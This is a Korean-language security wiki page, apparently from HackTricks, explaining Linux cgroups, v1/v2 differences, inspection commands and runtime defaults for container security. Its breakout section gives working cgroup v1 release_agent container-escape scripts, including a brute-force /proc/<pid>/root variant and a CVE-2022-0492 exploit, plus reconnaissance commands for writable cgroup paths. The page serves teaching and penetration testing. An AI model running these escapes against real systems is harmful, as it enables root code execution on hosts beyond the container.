# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux **control groups**는 accounting, limiting, prioritization 및 policy enforcement를 위해 프로세스를 함께 그룹화하는 데 사용되는 kernel 메커니즘입니다. namespaces가 주로 리소스에 대한 view를 격리하는 것이라면, cgroups는 주로 프로세스 집합이 해당 리소스를 **얼마나 많이** 사용할 수 있는지, 그리고 경우에 따라 **어떤 리소스 클래스**와 상호작용할 수 있는지를 관리합니다. 사용자가 직접 확인하지 않더라도 Containers는 cgroups에 지속적으로 의존합니다. 거의 모든 최신 runtime에는 kernel에 "이 프로세스들은 이 workload에 속하며, 다음 resource rules가 적용된다"고 전달할 방법이 필요하기 때문입니다.

이 때문에 container engines는 새 container를 자체 cgroup subtree에 배치합니다. process tree가 그곳에 들어가면 runtime은 memory를 제한하고, PIDs 수를 제한하며, CPU 사용량에 weight를 적용하고, I/O를 조절하며, device access를 제한할 수 있습니다. Production environment에서는 multi-tenant safety와 기본적인 operational hygiene 모두에 필수적입니다. 의미 있는 resource controls가 없는 container는 memory를 모두 소진하거나, 시스템에 과도한 프로세스를 생성하거나, CPU와 I/O를 독점하여 host 또는 인접 workload를 불안정하게 만들 수 있습니다.

Security 관점에서 cgroups는 두 가지 별개의 이유로 중요합니다. 첫째, 잘못된 resource limits 또는 resource limits의 부재는 단순한 denial-of-service attacks를 가능하게 합니다. 둘째, 일부 cgroup features, 특히 오래된 **cgroup v1** setups에서는 container 내부에서 write할 수 있을 때 강력한 breakout primitives를 만들어낸 역사적 사례가 있습니다.

## v1 Vs v2

현재 사용되는 cgroup models에는 두 가지 주요 유형이 있습니다. **cgroup v1**은 여러 controller hierarchies를 노출하며, 오래된 exploit writeups는 그곳에서 사용할 수 있었던 특이하고 때로는 지나치게 강력한 semantics를 중심으로 하는 경우가 많습니다. **cgroup v2**는 더욱 unified hierarchy와 일반적으로 더 깔끔한 behavior를 도입합니다. 최신 distributions는 점점 cgroup v2를 선호하지만, mixed 또는 legacy environments도 여전히 존재하므로 실제 systems를 검토할 때는 두 model 모두 여전히 중요합니다.

이 차이가 중요한 이유는 **`release_agent`**를 이용한 abuse와 같은 가장 유명한 container breakout 사례 중 일부가 오래된 cgroup behavior와 매우 밀접하게 연결되어 있기 때문입니다. Blog에서 cgroup exploit을 본 독자가 이를 modern cgroup v2-only system에 무작정 적용하면, target에서 실제로 가능한 일을 잘못 이해할 가능성이 높습니다.

## 검사

현재 shell이 어디에 위치하는지 확인하는 가장 빠른 방법은 다음과 같습니다:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 파일에는 현재 프로세스와 연결된 cgroup 경로가 표시됩니다. 최신 cgroup v2 호스트에서는 unified 항목이 표시되는 경우가 많습니다. 이전 버전 또는 hybrid 호스트에서는 여러 v1 controller 경로가 표시될 수 있습니다. 경로를 확인한 후 `/sys/fs/cgroup` 아래의 해당 파일을 검사하면 limit 및 현재 사용량을 확인할 수 있습니다.

cgroup v2 호스트에서는 다음 명령이 유용합니다:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
이 파일들은 어떤 컨트롤러가 존재하며, 어떤 컨트롤러가 하위 cgroup에 위임되었는지 보여 줍니다. 이 위임 모델은 rootless 및 systemd-managed 환경에서 중요합니다. 런타임이 제어할 수 있는 cgroup 기능의 범위가 상위 계층에서 실제로 위임한 기능의 일부로 제한될 수 있기 때문입니다.

## Lab

실제 환경에서 cgroups를 관찰하는 한 가지 방법은 memory 제한이 설정된 컨테이너를 실행하는 것입니다:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID 제한 컨테이너도 시도해 볼 수 있습니다:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
이 예제들은 runtime flag를 kernel file interface와 연결하는 데 유용합니다. runtime은 마법처럼 규칙을 강제하는 것이 아니라, 관련 cgroup 설정을 기록한 다음 kernel이 process tree에 해당 규칙을 적용하도록 합니다.

## Runtime 사용

Docker, Podman, containerd, CRI-O는 모두 정상적인 작업의 일부로 cgroups에 의존합니다. 일반적으로 차이점은 cgroups를 사용하는지 여부가 아니라, **어떤 기본값을 선택하는지**, **systemd와 어떻게 상호작용하는지**, **rootless delegation이 어떻게 작동하는지**, **설정 중 어느 정도가 engine level에서 제어되고 어느 정도가 orchestration level에서 제어되는지**에 있습니다.

Kubernetes에서는 resource requests와 limits가 결국 node의 cgroup 설정이 됩니다. Pod YAML에서 kernel enforcement까지의 경로에는 kubelet, CRI runtime, OCI runtime이 포함되지만, 최종적으로 규칙을 적용하는 kernel 메커니즘은 여전히 cgroups입니다. Incus/LXC 환경에서도 cgroups가 광범위하게 사용되며, 특히 system containers는 더 풍부한 process tree와 VM과 유사한 운영상의 요구사항을 노출하는 경우가 많기 때문입니다.

## Misconfigurations And Breakouts

전형적인 cgroup security 사례는 쓰기 가능한 **cgroup v1 `release_agent`** 메커니즘입니다. 이 모델에서 attacker가 적절한 cgroup 파일에 쓸 수 있고, `notify_on_release`를 활성화하며, `release_agent`에 저장되는 경로를 제어할 수 있다면, cgroup이 비어 있을 때 kernel이 host의 initial namespaces에서 attacker가 선택한 경로를 실행하게 될 수 있습니다. 이것이 과거 writeup에서 cgroup controller의 writability, mount options, namespace/capability 조건에 큰 관심을 두었던 이유입니다.

`release_agent`를 사용할 수 없는 경우에도 cgroup 실수는 여전히 중요합니다. 지나치게 광범위한 device access는 host device를 container에서 접근 가능하게 만들 수 있습니다. memory 및 PID limits가 없으면 단순한 code execution이 host DoS로 이어질 수 있습니다. rootless 시나리오에서 약한 cgroup delegation은 runtime이 실제로 제한을 적용할 수 없었음에도 defender가 제한이 존재한다고 오해하게 만들 수 있습니다.

### `release_agent` Background

`release_agent` technique은 **cgroup v1**에만 적용됩니다. 기본 아이디어는 cgroup의 마지막 process가 종료되고 `notify_on_release=1`이 설정되어 있으면, kernel이 `release_agent`에 저장된 경로의 program을 실행한다는 것입니다. 이 실행은 **host의 initial namespaces**에서 이루어지며, 이것이 쓰기 가능한 `release_agent`를 container escape primitive로 만드는 핵심입니다.

이 technique이 작동하려면 attacker에게 일반적으로 다음 권한이 필요합니다.

- 쓰기 가능한 **cgroup v1** hierarchy
- child cgroup을 생성하거나 사용할 수 있는 권한
- `notify_on_release`를 설정할 수 있는 권한
- `release_agent`에 경로를 기록할 수 있는 권한
- host 관점에서 executable로 해석되는 경로

### Classic PoC

역사적인 one-liner PoC는 다음과 같습니다.<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
이 PoC는 `release_agent`에 payload 경로를 기록하고, cgroup release를 트리거한 다음, host에서 생성된 output file을 다시 읽습니다.

### 읽기 쉬운 단계별 설명

같은 아이디어를 단계로 나누면 더 쉽게 이해할 수 있습니다.<sup>[[1]](#references)</sup>

1. 쓰기 가능한 cgroup을 생성하고 준비합니다:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 컨테이너 파일 시스템에 해당하는 호스트 경로를 식별합니다:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. 호스트 경로에서 확인할 수 있는 payload를 배치합니다:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup을 비워 실행을 트리거합니다:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
그 결과는 host root privileges로 payload가 host 측에서 실행되는 것입니다. 실제 exploit에서는 payload가 일반적으로 proof file을 작성하거나, reverse shell을 실행하거나, host state를 수정합니다.

### `/proc/<pid>/root`를 사용하는 Relative Path Variant

일부 환경에서는 container filesystem으로 연결되는 host path가 명확하지 않거나 storage driver에 의해 숨겨져 있습니다. 이 경우 payload path는 `/proc/<pid>/root/...`를 통해 표현할 수 있으며, 여기서 `<pid>`는 현재 container의 프로세스에 속한 host PID입니다. 이것이 relative-path brute-force variant의 기반입니다:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
여기서 중요한 trick은 brute force 자체가 아니라 path 형식입니다. `/proc/<pid>/root/...`를 사용하면 직접적인 host storage path를 미리 알지 못하더라도 kernel이 host namespace에서 container filesystem 내부의 file을 resolve할 수 있습니다.

### CVE-2022-0492 Variant

2022년에 CVE-2022-0492는 cgroup v1의 `release_agent`에 write할 때 **initial** user namespace에서 `CAP_SYS_ADMIN`을 올바르게 확인하지 않는다는 사실을 보여주었습니다. 이로 인해 취약한 kernel에서 이 technique에 훨씬 쉽게 접근할 수 있었습니다. cgroup hierarchy를 mount할 수 있는 container process는 host user namespace에서 이미 privileged 상태가 아니더라도 `release_agent`에 write할 수 있었기 때문입니다.<sup>[[3]](#references)</sup>

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
취약한 kernel에서는 host가 host root 권한으로 `/proc/self/exe`를 실행합니다.

실제로 악용하려면 먼저 해당 환경에서 쓰기 가능한 cgroup-v1 경로 또는 위험한 device access가 여전히 노출되어 있는지 확인합니다:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
`release_agent`가 존재하고 writable하다면, 이미 legacy-breakout 영역에 들어선 것입니다:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup path 자체로 escape를 수행할 수 없다면, 다음으로 실용적인 용도는 대개 denial of service 또는 reconnaissance입니다:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
이 명령어를 사용하면 워크로드에 fork-bomb을 실행하거나, 메모리를 공격적으로 소비하거나, 쓰기 가능한 legacy cgroup interface를 악용할 여지가 있는지 빠르게 확인할 수 있습니다.

## 점검

대상을 검토할 때 cgroup 점검의 목적은 어떤 cgroup 모델이 사용 중인지, 컨테이너에서 쓰기 가능한 controller 경로가 보이는지, 그리고 `release_agent`와 같은 이전 breakout primitive이 실제로 관련이 있는지 파악하는 것입니다.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
여기서 흥미로운 점:

- `mount | grep cgroup`가 **cgroup v1**을 표시한다면, 이전의 breakout writeup이 더 중요해집니다.
- `release_agent`가 존재하고 접근 가능하다면, 즉시 더 자세히 조사할 가치가 있습니다.
- 표시된 cgroup 계층 구조에 쓰기 권한이 있고 container에 강력한 capabilities도 있다면, 해당 환경을 훨씬 면밀히 검토해야 합니다.

**cgroup v1**, 쓰기 가능한 controller mount, 그리고 강력한 capabilities 또는 취약한 seccomp/AppArmor 보호 기능을 가진 container를 발견했다면, 이 조합에 주의 깊게 대응해야 합니다. cgroup은 흔히 지루한 resource-management 주제로 취급되지만, 역사적으로 가장 유익한 container escape chain 중 일부에 포함되어 왔습니다. 이는 "resource control"과 "host influence" 사이의 경계가 사람들이 생각한 것만큼 항상 명확하지 않았기 때문입니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 Enabled | Container는 자동으로 cgroup에 배치되며, flags로 설정하지 않는 한 resource limit은 선택 사항입니다 | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` 생략; `--device`; `--privileged` |
| Podman | 기본적으로 Enabled | `--cgroups=enabled`가 기본값이며, cgroup version에 따라 cgroup namespace 기본값이 달라집니다(cgroup v2에서는 `private`, 일부 cgroup v1 설정에서는 `host`) | `--cgroups=disabled`, `--cgroupns=host`, 완화된 device access, `--privileged` |
| Kubernetes | 기본적으로 runtime을 통해 Enabled | Pod와 container는 node runtime에 의해 cgroup에 배치되며, 세밀한 resource control은 `resources.requests` / `resources.limits` 설정에 따라 달라집니다 | resource requests/limits 생략, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | 기본적으로 Enabled | cgroup은 일반적인 lifecycle management의 일부입니다 | device control을 완화하거나 기존의 쓰기 가능한 cgroup v1 interface를 노출하는 직접적인 runtime 설정 |

중요한 구분은 **cgroup의 존재**는 일반적으로 기본값인 반면, **유용한 resource constraint**는 명시적으로 구성하지 않으면 선택 사항인 경우가 많다는 점입니다.

## References

- [1] [Docker container escape 이해하기](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Cgroups에 영향을 미치는 새로운 Linux Vulnerability CVE-2022-0492: Container가 Escape할 수 있는가?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
